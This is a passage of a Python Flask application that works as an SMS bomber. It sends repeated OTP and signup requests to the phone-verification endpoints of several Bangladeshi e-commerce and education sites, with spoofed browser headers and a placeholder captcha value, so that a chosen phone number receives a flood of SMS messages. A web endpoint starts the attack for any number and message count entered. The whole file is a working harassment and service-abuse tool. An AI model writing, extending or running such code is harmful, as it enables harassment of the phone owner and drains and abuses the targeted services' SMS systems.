        '------WebKitFormBoundarysGgq52bptHgKt5Se--\r\n'
    )
    try:
        response = requests.post(url, headers=headers, data=data, verify=False)
        return response.status_code == 200
    except Exception:
        return False

def call_digihaat_api(phone_number):
    url = "https://api.digihaat.com.bd/api/otp/generate-otp"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://digihaat.com.bd",
        "Referer": "https://digihaat.com.bd/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    }
    data = {"phoneNo": phone_number}
    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 201
    except Exception:
        return False

def call_waltonplaza_api(phone_number):
    url = "https://waltonplaza.com.bd/api/auth/otp/create"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://waltonplaza.com.bd",
        "referer": "https://waltonplaza.com.bd/auth/phone-login",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    data = {
        "auth": {
            "countryCode": "880",
            "deviceUuid": "7f546480-32d7-11f0-8ba9-27d90ca7bd48",
            "phone": phone_number.lstrip("+88"),
            "type": "LOGIN"
        },
        "captchaToken": "no recapcha"
    }

    try:
        response = requests.post(url, json=data, headers=headers)
        return response.status_code == 200
    except:
        return False

def call_shwapno_api(phone_number):
    url = "https://www.shwapno.com/api/auth"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.shwapno.com",
        "referer": "https://www.shwapno.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    data = {
        "phoneNumber": phone_number  # full number must be passed correctly
    }

    try:
        response = requests.post(url, json=data, headers=headers)
        return response.status_code == 200
    except:
        return False

def call_shikho_api(phone_number):
    url = "https://api.shikho.com/auth/v2/send/sms"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://shop.shikho.com",
        "referer": "https://shop.shikho.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    data = {
        "phone": phone_number,  # must include 880 prefix if needed
        "type": "student",
        "auth_type": "signup",
        "vendor": "shikho"
    }

    try:
        response = requests.post(url, json=data, headers=headers)
        return response.status_code == 200
    except:
        return False

# Automatically collect all functions starting with call_ and ending with _api
api_functions = [
    func for name, func in inspect.getmembers(sys.modules[__name__], inspect.isfunction)
    if name.startswith("call_") and name.endswith("_api")
]

# Shared state for real-time tracking
status_data = {
    "sent": 0,
    "failed": [],
    "running": False
}

def bomb(phone_number, amount):
    status_data["sent"] = 0
    status_data["failed"] = []
    status_data["running"] = True

    total_apis = len(api_functions)

    if amount <= total_apis:
        # Just call the first `amount` APIs once
        for api in api_functions[:amount]:
            success = api(phone_number)
            if success:
                status_data["sent"] += 1
            else:
                status_data["failed"].append(api.__name__)
    else:
        index = 0
        while status_data["sent"] < amount:
            api = api_functions[index % total_apis]
            success = api(phone_number)
            if success:
                status_data["sent"] += 1
            else:
                status_data["failed"].append(api.__name__)
            index += 1

    status_data["running"] = False
    
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/bomb', methods=['POST'])
def start_bombing():
    data = request.get_json()
    phone = data.get("phone")
    amount = int(data.get("amount", 0))

    if not phone or amount <= 0:
        return jsonify({"status": "error", "message": "Invalid input"}), 400

    if status_data["running"]:
        return jsonify({"status": "error", "message": "A task is already running."}), 429

    threading.Thread(target=bomb, args=(phone, amount)).start()
    return jsonify({"status": "started", "message": f"Sending up to {amount} SMS to {phone}"}), 200

@app.route('/status', methods=['GET'])
def get_status():
    return jsonify({
        "sent": status_data["sent"],
        "failed": status_data["failed"],
        "running": status_data["running"]
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=3000)